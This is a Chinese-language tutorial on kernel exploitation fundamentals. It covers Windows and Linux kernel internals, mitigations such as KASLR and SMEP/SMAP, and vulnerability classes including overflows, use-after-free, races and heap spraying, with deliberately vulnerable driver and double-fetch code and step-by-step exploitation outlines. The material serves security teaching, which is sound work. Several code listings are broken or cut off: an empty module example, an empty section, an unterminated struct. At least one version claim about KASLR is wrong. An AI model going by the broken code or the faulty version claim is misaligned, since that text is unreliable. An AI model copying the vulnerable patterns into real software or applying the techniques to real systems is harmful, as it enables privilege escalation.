# 内核漏洞利用基础

> 本文档面向已有用户态漏洞利用基础的学习者，系统讲解内核漏洞利用的核心原理、技术方法与实战技巧。

## 第1章 内核安全概述

### 1.1 操作系统内核架构

操作系统内核是计算机系统的核心，负责管理硬件资源、提供系统调用接口、调度进程与内存管理。内核架构的设计直接影响系统的安全性、稳定性与性能。

#### 1.1.1 微内核架构 vs 宏内核架构

**宏内核（Monolithic Kernel）**：将所有操作系统服务（进程管理、内存管理、文件系统、设备驱动、网络协议栈等）都运行在内核态的同一地址空间中。Linux和传统的UNIX内核是典型的宏内核设计。宏内核的优势在于性能高，各模块间直接函数调用；缺点是代码量大、攻击面广，单个驱动漏洞可能危及整个内核安全。

**微内核（Microkernel）**：将尽可能多的操作系统服务移到用户态，内核仅保留最基本的功能（如进程间通信IPC、基本调度、内存管理原语）。QNX、Minix是典型的微内核。微内核的优势在于隔离性好，单个服务崩溃不影响整个系统；缺点是IPC开销较大，性能相对较低。

现代操作系统普遍采用"混合内核"设计：Windows NT内核在宏内核基础上引入了微内核的一些思想（如用户态驱动框架），而Linux也通过可加载内核模块（LKM）实现了模块化。

#### 1.1.2 Windows内核架构概览

Windows内核采用分层设计，从底向上依次为：

- **硬件抽象层（HAL）**：屏蔽硬件差异，提供统一的硬件访问接口
- **内核层（NTOS Kernel）**：提供基础原语，如调度、同步、中断处理
- **执行体层（Executive）**：提供高级服务，如进程管理、内存管理、I/O管理、对象管理、安全引用监视器等
- **驱动程序**：设备驱动、文件系统驱动、网络驱动等
- **系统调用接口**：Ntdll.dll中的syscall存根（stub）

Windows内核的核心文件是`ntoskrnl.exe`，它包含了内核层和执行体层的大部分代码。

#### 1.1.3 Linux内核架构概览

Linux内核是典型的宏内核设计，主要子系统包括：

- **进程调度子系统**：负责进程创建、销毁、调度
- **内存管理子系统**：虚拟内存、物理内存管理、页表管理
- **文件系统子系统**：VFS抽象层及各具体文件系统（ext4、btrfs等）
- **网络子系统**：TCP/IP协议栈、网络设备驱动
- **设备驱动子系统**：字符设备、块设备、网络设备驱动
- **中断与异常处理**：中断控制器驱动、异常向量表

Linux内核采用模块化设计，支持运行时加载/卸载内核模块（.ko文件），这极大地扩展了内核的功能，同时也带来了安全挑战。

### 1.2 内核态与用户态区别

现代操作系统通过特权级分离实现安全隔离。x86架构提供了4个特权级（Ring 0~3），而实际操作系统通常只使用两个：Ring 0（内核态）和Ring 3（用户态）。

#### 1.2.1 权限差异

| 特性 | 用户态（Ring 3） | 内核态（Ring 0） |
|------|-----------------|-----------------|
| 内存访问 | 仅能访问用户态虚拟地址空间 | 可访问全部虚拟地址空间（含内核地址空间） |
| 指令执行 | 仅能执行非特权指令 | 可执行全部指令（含特权指令如mov cr0、in/out等） |
| I/O操作 | 需通过系统调用间接完成 | 可直接操作I/O端口和内存映射I/O |
| 中断处理 | 无法直接处理中断 | 可注册中断处理函数 |
| 寄存器访问 | 受限（如无法直接修改CR3、GDTR等控制寄存器） | 完全控制 |

#### 1.2.2 地址空间隔离

在32位系统中，典型的地址空间划分是用户态2GB + 内核态2GB（Windows）或用户态3GB + 内核态1GB（Linux经典配置）。在64位系统中，用户态和内核态拥有独立的巨大地址空间（通常为256TB级别），通过页表的全局位（G位）和CR3切换实现隔离。

关键概念：
- **用户态地址空间**：每个进程独立拥有，包含代码段、数据段、堆、栈、映射文件等
- **内核态地址空间**：所有进程共享，包含内核代码、内核数据结构、内核栈、页表等
- **进程上下文切换**：切换CR3寄存器以切换页表，同时切换内核栈

#### 1.2.3 系统调用流程

用户态程序通过系统调用（System Call）进入内核态请求内核服务。典型的系统调用流程：

1. 用户态程序将系统调用号存入指定寄存器（x86_64下为rax）
2. 准备系统调用参数（存入rdi、rsi、rdx、r10、r8、r9等寄存器）
3. 执行`syscall`指令（x86_64）或`int 0x80`（x86 32位）
4. CPU切换到内核态，跳转到内核的系统调用入口点
5. 内核根据系统调用号分发到对应的处理函数
6. 处理完成后，通过`sysret`或`iret`返回用户态

内核漏洞利用的核心目标就是：在只有用户态权限的情况下，通过利用内核代码中的漏洞，实现从用户态到内核态的权限提升（Privilege Escalation）。

### 1.3 内核漏洞的危害与影响

内核漏洞的危害性远大于普通的用户态漏洞，原因如下：

#### 1.3.1 权限提升（Privilege Escalation）

- **本地提权（LPE）**：攻击者从普通用户权限提升到系统最高权限（Windows的SYSTEM、Linux的root）
- **容器逃逸**：在Docker等容器环境中，通过内核漏洞逃逸到宿主机
- **沙箱绕过**：绕过浏览器沙箱、AppContainer等安全沙箱机制

#### 1.3.2 安全机制完全绕过

一旦控制了内核，攻击者可以：
- 关闭所有安全机制（如PatchGuard、Driver Signature Enforcement等）
- 直接修改任意进程的内存和权限
- 隐藏进程、文件、网络连接（Rootkit技术）
- 绕过杀毒软件和EDR检测

#### 1.3.3 影响范围广泛

- 内核漏洞通常影响同一内核版本的所有系统
- 共享内核的虚拟化环境中，一个虚拟机的内核漏洞可能影响宿主机和其他虚拟机
- 移动设备（Android）的内核漏洞可用于root设备

### 1.4 内核安全机制概述

现代操作系统部署了多层安全防护机制，大大增加了内核漏洞利用的难度。

#### 1.4.1 KASLR（内核地址空间布局随机化）

KASLR将内核代码、数据、栈、堆等的地址随机化，使得攻击者无法预先知道内核中关键函数和数据结构的地址。攻击者必须首先泄露内核地址（信息泄露漏洞），才能构造有效的利用链。

- **Windows**：自Windows 8开始引入内核ASLR，每次系统启动时内核基址随机化
- **Linux**：自2.6.12开始支持KASLR，可通过启动参数`kaslr`启用

#### 1.4.2 SMEP / SMAP

**SMEP（Supervisor Mode Execution Protection）**：当CPU处于内核态（Supervisor Mode）时，禁止执行用户态页面中的代码。这直接阻止了传统的"ret2usr"技术——即内核漏洞利用中跳转到用户态shellcode的方法。

**SMAP（Supervisor Mode Access Prevention）**：当CPU处于内核态时，禁止访问用户态页面中的数据。这使得内核态下直接读写用户态数据变得困难，必须使用特定的API（如`copy_from_user`/`copy_to_user`）。

- **支持情况**：Intel Ivy Bridge及以后的CPU支持SMEP，Broadwell及以后支持SMAP
- **Windows**：Windows 8及以上启用SMEP，Windows 10 1703及以上启用SMAP
- **Linux**：内核3.0+支持SMEP，3.7+支持SMAP

#### 1.4.3 NX / DEP

**NX（No eXecute）** / **DEP（Data Execution Prevention）**：将内存页面标记为不可执行，防止数据段中的代码被执行。这在内核中同样有效，内核堆、栈默认都是不可执行的。

#### 1.4.4 CFG / CFI

**CFG（Control Flow Guard）**：微软推出的控制流完整性保护机制，在编译时为间接调用添加检查，确保调用目标是合法的函数入口。内核CFG（kCFG）在Windows 10 1709及以上版本启用。

**CET（Control-flow Enforcement Technology）**：Intel推出的硬件级控制流完整性保护，包括影子栈（Shadow Stack）和间接分支跟踪（IBT）。影子栈用于保护返回地址，IBT用于保护间接跳转。

#### 1.4.5 其他缓解机制

- **Stack Canary / GS Cookie**：内核栈溢出保护
- **Heap Cookie**：堆元数据保护
- **PatchGuard（Windows）**：内核完整性保护，阻止未授权的内核补丁
- **Driver Signature Enforcement（DSE）**：驱动数字签名强制
- **KPTI（Kernel Page Table Isolation）**：页表隔离，缓解Meltdown漏洞
- **FG-KASLR**：细粒度内核ASLR，将内核代码随机化到函数级别

## 第2章 Windows内核基础

### 2.1 Windows内核架构

Windows NT内核是一个混合内核，兼具宏内核的性能和微内核的模块化设计。

#### 2.1.1 NTOS内核组件

`ntoskrnl.exe`是Windows内核的核心文件，包含以下主要组件：

**内核层（Kernel Layer）**：
- 线程调度与上下文切换
- 中断与异常处理
- 同步原语（自旋锁、互斥量、事件等）
- 定时器管理
- 多处理器支持

**执行体层（Executive Layer）**：
- **进程管理器**：进程/线程创建与销毁
- **内存管理器**：虚拟内存管理、物理内存管理、页文件
- **I/O管理器**：I/O请求包（IRP）处理、设备驱动管理
- **对象管理器**：内核对象的创建、管理与安全
- **配置管理器**：注册表管理
- **安全引用监视器（SRM）**：安全策略执行
- **即插即用管理器**：设备枚举与驱动加载
- **电源管理器**：电源策略管理

#### 2.1.2 硬件抽象层（HAL）

HAL（`hal.dll`）的作用是屏蔽底层硬件差异，为内核提供统一的硬件访问接口。HAL处理：
- 中断控制器（APIC/IOAPIC）编程
- 系统计时器
- DMA操作
- 多处理器间通信（IPI）
- 总线适配器抽象

这使得Windows内核可以在不同硬件平台上运行，而无需大幅修改内核代码。

#### 2.1.3 驱动模型

Windows驱动程序运行在内核态，是内核攻击面的重要组成部分。

**WDM（Windows Driver Model）**：
- 分层驱动模型，由上层到下层依次为：过滤驱动 → 功能驱动 → 总线驱动
- 每个驱动创建设备对象（DEVICE_OBJECT），设备对象形成设备栈
- I/O请求以IRP（I/O Request Packet）的形式在设备栈中传递
- 驱动的入口点是`DriverEntry`，负责创建设备对象和设置分发函数

**WDF（Windows Driver Framework）**：
- 基于WDM的高级框架，分为KMDF（内核态）和UMDF（用户态）
- 封装了大量WDM的底层细节，简化驱动开发
- 提供即插即用、电源管理、I/O队列等默认实现
- UMDF驱动运行在用户态，降低了漏洞影响范围

### 2.2 系统调用机制

#### 2.2.1 系统调用分发

Windows系统调用的分发机制：

1. 用户态程序调用`ntdll.dll`中的存根函数（如`NtReadFile`）
2. 存根函数将系统调用号（SSDT索引）放入eax寄存器
3. x86_32使用`sysenter`指令，x86_64使用`syscall`指令进入内核
4. 内核的系统调用入口（`KiSystemCall64`/`KiFastCallEntry`）保存上下文
5. 根据SSDT（System Service Descriptor Table）查找处理函数地址
6. 调用对应的内核服务函数（如`NtReadFile`的内核实现）

#### 2.2.2 SSDT结构

SSDT是一个函数指针表，定义如下（简化）：

```c
typedef struct _SYSTEM_SERVICE_TABLE {
    PULONG ServiceTableBase;       // 服务函数地址表基址
    PULONG ServiceCounterTableBase; // 服务计数器表（仅Checked Build）
    ULONG NumberOfServices;         // 服务函数数量
    PUCHAR ParamTableBase;          // 参数表（每个函数的参数总长度，以字节为单位）
} SYSTEM_SERVICE_TABLE, *PSYSTEM_SERVICE_TABLE;
```

Windows有两个主要的系统服务表：
- **KeServiceDescriptorTable**：NT系统服务（Nt*系列函数）
- **KeServiceDescriptorTableShadow**：包含NT和Win32k系统服务（用于GUI线程）

**注意**：在较新的Windows版本中，SSDT的地址受到保护，且每个函数的地址经过随机化处理。

#### 2.2.3 系统调用参数传递

- **x86_32**：参数通过用户栈传递，内核从用户栈复制参数到内核栈
- **x86_64**：前4个参数通过rcx、rdx、r8、r9寄存器传递，其余通过栈传递
- 系统调用参数在内核中被验证（ProbeForRead/ProbeForWrite），确保用户态缓冲区的合法性

### 2.3 内核对象与句柄表

#### 2.3.1 内核对象体系

Windows执行体通过对象管理器统一管理各种内核资源。常见的内核对象类型包括：

- **进程对象（EPROCESS）**：表示一个进程
- **线程对象（ETHREAD）**：表示一个线程
- **文件对象（FILE_OBJECT）**：表示一个打开的文件
- **事件对象（KEVENT）**：用于线程同步
- **互斥量对象（KMUTANT）**：用于互斥访问
- **信号量对象（KSEMAPHORE）**：用于资源计数
- **令牌对象（TOKEN）**：表示进程/线程的安全上下文
- **注册表键对象（CM_KEY_BODY）**：表示打开的注册表项

每个内核对象都有：
- **对象头（OBJECT_HEADER）**：包含对象类型、引用计数、名称、安全描述符等元信息
- **对象体**：具体类型的数据结构

#### 2.3.2 句柄表机制

用户态通过**句柄（Handle）**访问内核对象，而不是直接使用内核指针。

句柄表的工作原理：
1. 每个进程有一个句柄表（Handle Table）
2. 句柄表是一个数组，每个条目（HANDLE_TABLE_ENTRY）包含一个内核对象指针和访问权限掩码
3. 用户态的HANDLE值本质上是句柄表的索引（经过编码）
4. 当调用`CreateFile`、`OpenProcess`等API时，内核创建对象并在句柄表中分配条目
5. 当调用`CloseHandle`时，减少对象引用计数，释放句柄表条目

**安全意义**：
- 句柄表隔离了用户态和内核态，防止用户态直接操纵内核对象
- 每个句柄有独立的访问权限（如PROCESS_ALL_ACCESS vs PROCESS_QUERY_INFORMATION）
- 内核漏洞利用中，常通过伪造句柄表条目来实现权限提升

### 2.4 驱动开发基础

#### 2.4.1 驱动入口与卸载

驱动程序的入口函数是`DriverEntry`，类似于用户态程序的`main`函数：

```c
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
) {
    // 设置驱动卸载函数
    DriverObject->DriverUnload = MyDriverUnload;
    
    // 设置IRP分发函数
    DriverObject->MajorFunction[IRP_MJ_CREATE] = MyCreateDispatch;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = MyCloseDispatch;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDeviceIoControlDispatch;
    
    // 创建设备对象和符号链接
    // ...
    
    return STATUS_SUCCESS;
}
```

#### 2.4.2 IRP与IOCTL

I/O请求包（IRP）是Windows内核I/O机制的核心。用户态程序通过`DeviceIoControl`与驱动通信，这会产生一个`IRP_MJ_DEVICE_CONTROL`类型的IRP。

IOCTL代码（控制码）的结构：
```
[设备类型(16位) | 功能码(12位) | 传输类型(2位) | 所需访问(2位)]
```

传输类型（最常被利用的部分）：
- **METHOD_BUFFERED**：系统将输入输出缓冲区都复制一份，最安全
- **METHOD_IN_DIRECT** / **METHOD_OUT_DIRECT**：使用MDL直接映射用户缓冲区
- **METHOD_NEITHER**：驱动直接使用用户态虚拟地址，最危险（如果驱动没有正确验证，极易导致漏洞）

**关键提示**：METHOD_NEITHER方式下，驱动直接使用用户态指针，是内核漏洞的高发区。审计驱动时应重点关注这种方式的IOCTL处理。

#### 2.4.3 内核内存管理

Windows内核的内存分配函数：

| 函数 | 用途 | 特点 |
|------|------|------|
| `ExAllocatePool` / `ExAllocatePoolWithTag` | 分配内核池内存 | 类似用户态的malloc，可指定池类型 |
| `ExFreePool` | 释放内核池内存 | 释放分配的池内存 |
| `MmAllocateNonCachedMemory` | 分配非缓存内存 | 不经过CPU缓存，适合DMA |
| `MmAllocateContiguousMemory` | 分配连续物理内存 | 物理地址连续，适合硬件DMA |
| `ExAllocatePoolWithQuota` | 带配额的池分配 | 计入进程配额 |

池类型（Pool Type）：
- **NonPagedPool**：非分页池，不会被交换到磁盘，可在任意IRQL访问
- **PagedPool**：分页池，可以被交换到磁盘，只能在PASSIVE_LEVEL访问
- **NonPagedPoolNx**：不可执行的非分页池（NX保护）

## 第3章 Linux内核基础

### 3.1 Linux内核架构

Linux内核是一个单体内核（Monolithic Kernel），采用模块化设计。了解内核的子系统划分是漏洞分析的基础。

#### 3.1.1 内核子系统划分

**进程调度子系统（Scheduler）**：
- 负责CPU资源分配，决定哪个进程何时运行
- CFS（完全公平调度器）是默认调度器
- 关键数据结构：`task_struct`（进程描述符）、`sched_entity`、`rq`（运行队列）

**内存管理子系统（MM）**：
- 虚拟内存管理：地址空间、VMA（虚拟内存区域）
- 物理内存管理：伙伴系统（Buddy System）、slab/slub分配器
- 页表管理：三级/四级/五级页表
- 反向映射（RMAP）：从物理页找到映射它的所有页表项
- 关键数据结构：`mm_struct`、`vm_area_struct`、`page`

**文件系统子系统（VFS）**：
- 虚拟文件系统（VFS）抽象层，统一文件操作接口
- 具体文件系统：ext4、xfs、btrfs、tmpfs、procfs、sysfs等
- 页缓存（Page Cache）：加速文件I/O
- 关键数据结构：`file`、`inode`、`dentry`、`super_block`

**网络子系统（Net）**：
- 协议栈：TCP、UDP、IP、ICMP等
- 套接字层：统一的socket API
- 网络设备驱动
- Netfilter：网络包过滤框架
- 关键数据结构：`sock`、`sk_buff`、`net_device`

**设备驱动子系统**：
- 字符设备驱动：`/dev`下的字符设备
- 块设备驱动：磁盘等块设备
- 网络设备驱动：网卡驱动
- 总线框架：PCI、USB、SPI、I2C等

### 3.2 系统调用机制

#### 3.2.1 系统调用入口

Linux的系统调用机制随架构不同而有所差异。以x86_64为例：

1. 用户态将系统调用号存入`rax`寄存器
2. 参数依次存入`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`
3. 执行`syscall`指令
4. CPU切换到内核态，跳转到`entry_SYSCALL_64`
5. 保存寄存器上下文（pt_regs结构）
6. 根据rax中的系统调用号，在系统调用表中查找处理函数
7. 调用处理函数，返回值存入rax
8. 通过`swapgs`和`sysretq`返回用户态

#### 3.2.2 系统调用表

系统调用表是一个函数指针数组，定义在`arch/x86/entry/syscalls/syscall_64.tbl`中。

```c
// 简化示例
asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscalls_max + 1] = {
    [0 ... __NR_syscalls_max] = &sys_ni_syscall,
    #include <asm/syscalls_64.h>
};
```

每个系统调用号对应一个内核函数，例如：
- 0号：`sys_read`
- 1号：`sys_write`
- 2号：`sys_open`
- 59号：`sys_execve`

**注意**：在内核漏洞利用中，`sys_call_table`是一个重要的目标。如果能修改它，就可以hook系统调用实现Rootkit功能。但现代内核中，sys_call_table所在的内存页是只读的。

#### 3.2.3 系统调用参数验证

内核在处理用户态传来的指针时必须格外小心，使用专用函数进行安全访问：

- `copy_from_user()`：从用户空间复制数据到内核空间，会检查用户指针的有效性
- `copy_to_user()`：从内核空间复制数据到用户空间
- `get_user()` / `put_user()`：简单类型的安全读写
- `access_ok()`：检查用户空间指针的可访问性

如果驱动或内核代码直接使用用户态指针而不经过这些函数，就可能导致安全漏洞。

### 3.3 内核模块编程

#### 3.3.1 内核模块基础

Linux内核模块（LKM）是可以动态加载和卸载的内核代码扩展。最简单的内核模块：

```c
#include <linux/init.h>

MODULE_LICENSE("GPL");

```

#### 3.3.2 模块加载与卸载


#### 3.3.3 字符设备驱动

字符设备是最常见的驱动类型，也是漏洞利用的常见入口：

```c
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>

#define DEVICE_NAME "mydevice"
#define BUF_LEN 1024

static int major;
static char msg[BUF_LEN];
static struct cdev my_cdev;

static int my_open(struct inode *inode, struct file *file) {
    return 0;
}

static ssize_t my_read(struct file *file, char __user *buf,
                       size_t len, loff_t *offset) {
    int bytes_read = 0;
    // 注意：必须使用copy_to_user而不是直接memcpy
    if (copy_to_user(buf, msg, len)) {
        return -EFAULT;
    }
    return len;
}

static ssize_t my_write(struct file *file, const char __user *buf,
                        size_t len, loff_t *offset) {
    // 漏洞示例：没有检查len的大小，可能导致缓冲区溢出
    if (copy_from_user(msg, buf, len)) {
        return -EFAULT;
    }
    return len;
}

static long my_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    // IOCTL处理

}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = my_open,
    .read = my_read,

    .unlocked_ioctl = my_ioctl,

```

**漏洞审计要点**：
- 检查用户输入的长度是否被正确验证
- 检查是否所有用户态指针都通过`copy_from_user`/`copy_to_user`访问
- 检查IOCTL命令处理是否验证了参数的合法性

### 3.4 内核数据结构

#### 3.4.1 链表（list_head）

Linux内核广泛使用双向循环链表，定义在`<linux/list.h>`中：

```c
struct list_head {
    struct list_head *next, *prev;
};
```

使用方式（嵌入到宿主结构中）：

```c
struct my_struct {
    int data;
    struct list_head list;  // 链表节点
};

// 初始化
LIST_HEAD(my_list);

// 添加节点
struct my_struct *node = kmalloc(sizeof(*node), GFP_KERNEL);
node->data = 42;
list_add(&node->list, &my_list);

// 遍历
struct my_struct *pos;
list_for_each_entry(pos, &my_list, list) {
    printk(KERN_INFO "data: %d\n", pos->data);
}
```

`list_entry(ptr, type, member)`宏通过链表节点指针反向获取宿主结构体指针，其实现利用了`container_of`宏：

```c
#define container_of(ptr, type, member) ({              \
    const typeof( ((type *)0)->member ) *__mptr = (ptr); \
    (type *)( (char *)__mptr - offsetof(type,member) );})
```

**安全意义**：内核堆溢出中，通过覆盖链表的next/prev指针可以实现任意地址写（类似用户态的unlink攻击）。

#### 3.4.2 哈希表（hlist）

Linux内核使用`hlist`（哈希链表）实现哈希表，特点是头节点只需要一个指针：

```c
struct hlist_head {
    struct hlist_node *first;
};

struct hlist_node {
    struct hlist_node *next;
    struct hlist_node **pprev;
};
```

hlist广泛用于内核中的各种缓存和查找表，如文件描述符表、inode缓存等。

#### 3.4.3 红黑树（rbtree）

Linux内核中的红黑树用于需要有序查找的数据结构，如CFS调度器的运行队列、内存区域管理等。定义在`<linux/rbtree.h>`中。

#### 3.4.4 RCU（Read-Copy-Update）

RCU是Linux内核中一种重要的同步机制，适用于读多写少的场景。

核心思想：
- 读者不需要任何锁，直接读取
- 写者修改数据时，先创建副本，修改副本，然后在适当时机替换原数据
- 被替换的旧数据需要等所有读者都离开临界区后才能释放（宽限期，Grace Period）

常用API：
- `rcu_read_lock()` / `rcu_read_unlock()`：读者端临界区
- `synchronize_rcu()`：等待宽限期结束
- `call_rcu()`：异步等待宽限期，完成后调用回调函数
- `rcu_assign_pointer()`：安全地赋值RCU保护的指针
- `rcu_dereference()`：安全地读取RCU保护的指针

**安全意义**：RCU的使用引入了新的竞态条件类型——use-after-free的变体。如果在宽限期结束前就释放了对象，或者读者端没有正确使用`rcu_dereference`，就可能导致漏洞。

## 第4章 内核漏洞类型

内核漏洞类型与用户态有很多相似之处，但由于内核运行环境的特殊性，其利用方式和影响程度有显著差异。本章详细介绍各类内核漏洞的原理和特点。

### 4.1 栈溢出

#### 4.1.1 内核栈溢出原理

内核栈溢出与用户态栈溢出原理相同——向栈上缓冲区写入超出其大小的数据，覆盖栈上的返回地址或其他关键数据。但内核栈溢出有以下特点：

**内核栈的特点**：
- **大小有限**：Windows内核栈通常为12KB或24KB，Linux内核栈通常为8KB或16KB（4KB页面的2或4倍），远小于用户态栈
- **不可扩展**：内核栈溢出后不会有用户态那样的guard page提示，直接导致内核崩溃（BSOD/OOPS）
- **共享性**：中断处理、异常处理可能借用当前进程的内核栈
- **结构复杂**：栈上不仅有函数调用帧，还有中断上下文、异常帧等

**触发场景**：
- 驱动程序的IOCTL处理中，将用户态数据复制到栈上缓冲区但未验证长度
- 内核函数中使用`strcpy`、`sprintf`等不安全字符串操作
- 递归调用深度过大导致栈耗尽（Stack Overflow）

#### 4.1.2 利用差异

与用户态栈溢出相比，内核栈溢出的利用有以下不同：

1. **目标不同**：用户态是获取代码执行，内核态是获取权限提升（通常是提权到root/SYSTEM）
2. **返回目标不同**：传统的ret2usr（返回用户态shellcode）已被SMEP阻止
3. **栈布局不同**：内核栈上有更多敏感数据（如`_KEXCEPTION_REGISTRATION_RECORD`、`_KTRAP_FRAME`等）
4. **崩溃后果不同**：用户态崩溃只影响当前进程，内核崩溃导致整个系统蓝屏/宕机

**经典利用路径（无SMEP时）**：
1. 溢出覆盖返回地址
2. 返回地址指向用户态的shellcode
3. Shellcode执行提权操作（如修改cred结构体）
4. 修复内核栈并返回用户态

**有SMEP时的利用路径**：
1. 溢出覆盖返回地址
2. 构造ROP链，在内核态完成提权
3. 通过`iret`/`sysret`返回用户态

### 4.2 堆溢出

#### 4.2.1 内核堆分配器

内核堆是漏洞利用的重要战场，不同操作系统有不同的堆分配器。

**Linux内核 - SLUB分配器**：

SLUB是当前Linux内核默认的分配器，核心概念：
- **slab**：一个或多个连续物理页组成的内存块
- **cache**：同一种大小对象的缓存（如`kmalloc-64`、`kmalloc-128`等）
- **object**：具体分配的对象

SLUB的关键特性：
- 每个CPU有per-cpu缓存（kmem_cache_cpu），快速分配释放
- slab有三种状态：full（全部分配）、partial（部分分配）、empty（全部空闲）
- 空闲对象通过freelist链表串联（指针存储在对象内部）

**Windows内核 - 堆管理器**：

Windows内核堆（Kernel Pool）的特点：
- 分为分页池（PagedPool）和非分页池（NonPagedPool）
- 池块有Pool Header（池头），记录大小、类型、标签等信息
- Windows 8引入了池随机化、池Cookie等保护
- Windows 10引入了更严格的池完整性检查（如Pool Integrity、Segment Heap）

#### 4.2.2 堆溢出利用原理

**Linux内核堆溢出**：

经典的堆溢出利用方法是覆盖相邻对象的数据：
1. 选择合适大小的slab缓存
2. 喷射大量目标对象，控制内存布局
3. 分配"受害者"对象和"溢出源"对象（使其在内存中相邻）
4. 利用溢出漏洞覆盖受害者对象的关键成员
5. 后续对受害者对象的操作触发任意读写或代码执行

常见的利用原语：
- **覆盖对象的虚函数表指针（vtable）**：后续调用虚函数时劫持控制流
- **覆盖链表节点指针**：通过链表操作实现任意地址写
- **覆盖函数指针**：直接修改回调函数指针

**Windows内核堆溢出**：

Windows堆溢出利用的演进：
- 早期：覆盖Pool Header的Next/Previous指针 → 任意地址写
- Vista/Win7：覆盖Pool Cookie导致保护增强 → 转向覆盖对象数据
- Win8+：利用类型混淆或UAF替代直接堆溢出

#### 4.2.3 堆喷射（Heap Spraying）

堆喷射是内核漏洞利用的关键技术，用于控制内存布局：

**目的**：
- 在特定地址放置可控数据
- 提高漏洞利用的可靠性
- 为后续利用步骤准备内存布局

**方法**：
- 反复分配大量内核对象（如通过创建大量文件句柄、套接字等）
- 利用特定大小的对象填充对应slab/池
- 精确控制"空洞"的位置和大小

**Linux内核堆喷射技巧**：
- 使用`msgsnd`/`msgrcv`操作消息队列（可精确控制分配大小和内容）
- 使用`setxattr`/`getxattr`扩展属性
- 使用`sendmsg`的消息控制数据（CMSG）
- 使用文件描述符表（fdtable）喷射
- 使用`timerfd`、`eventfd`、`signalfd`等特殊文件描述符

### 4.3 空指针引用（NULL Pointer Dereference）

#### 4.3.1 漏洞原理

空指针引用发生在内核代码对NULL指针进行解引用时。如果攻击者能够将NULL页（地址0）映射到用户态并填充可控数据，那么内核访问NULL指针偏移处的数据时，实际上会读取攻击者可控的数据。

**典型触发场景**：
```c
struct object *obj = get_object(); // 可能返回NULL
// 缺少NULL检查
obj->callback(obj->data); // 空指针解引用
```

#### 4.3.2 利用方法

**经典利用（无SMAP时）**：
1. 使用`mmap`将地址0映射到用户态（需要关闭`mmap_min_addr`保护）
2. 在地址0处伪造内核对象
3. 触发空指针引用，内核访问地址0处的数据
4. 如果被访问的是函数指针，则直接劫持控制流

**缓解机制**：
- `mmap_min_addr`：限制用户态可以映射的最低地址（通常为65536）
- SMAP：阻止内核态直接访问用户态内存
- 现代内核中，空指针引用漏洞的利用难度大大增加

### 4.4 释放后重用（Use-After-Free, UAF）

#### 4.4.1 漏洞原理

UAF是指内存块被释放后，仍然被引用（读或写）。这是内核漏洞中最常见、也是最危险的类型之一。

**典型场景**：
```c
struct object *obj = kmalloc(sizeof(*obj), GFP_KERNEL);
// ... 使用obj ...
kfree(obj);
// ... 中间逻辑 ...
obj->callback(); // Use-After-Free！
```

#### 4.4.2 为什么UAF在内核中更危险

1. **内核堆对象通常包含函数指针**：如文件操作结构体（file_operations）、设备操作结构体等，UAF可以轻易劫持控制流
2. **对象生命周期复杂**：引用计数、RCU、异步回调等机制使对象生命周期难以正确管理
3. **堆重用可控性高**：通过堆喷射可以精确控制释放的内存被什么数据覆盖

#### 4.4.3 利用步骤

标准UAF利用流程：

1. **分配对象**：创建并使用内核对象（如打开设备、创建文件等）
2. **释放对象**：通过某种方式释放对象（如关闭句柄），但保留"悬空指针"
3. **重新占用（Reallocation）**：分配与原对象相同大小的其他对象，填充可控数据，占据原对象的内存位置
4. **触发重用**：通过悬空指针再次访问对象，此时对象内容已被攻击者控制
5. **实现利用**：通过伪造的虚函数表、函数指针等劫持控制流

**关键技术点**：
- 选择与目标对象相同大小的"占位"对象类型
- 占位对象的内容必须可控
- 确保释放的内存块确实被新分配的对象占用（slab freelist的LIFO特性通常能保证这一点）

### 4.5 竞态条件（Race Condition）

#### 4.5.1 TOCTOU漏洞

TOCTOU（Time Of Check To Time Of Use）是最常见的竞态条件类型：检查时和使用时的状态不一致。

**内核中的典型场景**：
- 用户态传递的数据在内核检查和使用之间被修改
- 共享数据结构在加锁间隙被修改
- 信号处理中断了临界区代码

**用户态数据竞争**：
```c
// 内核代码示例（有漏洞）
if (user_buf->length < MAX_SIZE) {  // Check
    // 此时用户态线程可能修改user_buf->length
    copy_from_user(kernel_buf, user_buf->data, user_buf->length);  // Use
}
```

利用方法：攻击者用一个线程不断修改`user_buf->length`，另一个线程触发系统调用，利用时间差实现越界读写。

#### 4.5.2 双取（Double Fetch）

双取是TOCTOU的一种特殊形式，内核从用户态内存读取同一数据两次，且两次读取之间数据可能被修改。

**示例**：
```c
// 第一次读取（检查）
copy_from_user(&hdr, user_ptr, sizeof(hdr));
if (hdr.length > MAX) return -EINVAL;

// 第二次读取（使用）
copy_from_user(buf, user_ptr + sizeof(hdr), hdr.length);
// 此时user_ptr处的数据可能已被修改，hdr.length可能变大
```

**利用技巧**：
- 使用多线程，一个线程修改用户态数据，一个线程触发系统调用
- 利用CPU调度的不确定性增加竞态窗口
- 可通过CPU亲和力、优先级等手段提高竞态成功率

#### 4.5.3 RCU相关竞态

RCU机制虽然高效，但如果使用不当也会引入漏洞：
- 写者在宽限期结束前就释放了数据
- 读者端未使用`rcu_dereference`正确获取指针
- `rcu_assign_pointer`和`rcu_dereference`不配对使用

### 4.6 整数溢出与符号错误

#### 4.6.1 整数溢出

整数溢出本身通常不直接导致代码执行，但常与其他漏洞结合，导致堆/栈溢出。

**典型模式**：
```c
// 分配计算溢出
size_t size = count * sizeof(struct entry);
buf = kmalloc(size, GFP_KERNEL);  // count过大时，size溢出为很小的值
copy_from_user(buf, user_buf, count * sizeof(struct entry));  // 实际复制更多数据 → 溢出
```

**常见类型**：
- 加法溢出
- 乘法溢出
- 无符号整数回绕（underflow）

#### 4.6.2 符号错误

有符号整数和无符号整数混用导致的问题：

```c
int len = -1;  // 有符号，值为-1
if (len > 1024)  // 比较时被转换为无符号，-1变成很大的正数
    return -EINVAL;
copy_from_user(buf, user_buf, len);  // len被当作size_t（无符号），复制大量数据 → 溢出
```

### 4.7 类型混淆（Type Confusion）

#### 4.7.1 漏洞原理

类型混淆是指程序将一种类型的对象当作另一种类型来使用。在C语言中，由于缺乏运行时类型信息（RTTI），类型混淆在内核中非常常见。

**典型场景**：
- 多态对象的向下转型（downcast）未验证实际类型
- 通过魔术字（magic number）标识类型但魔术字可被伪造
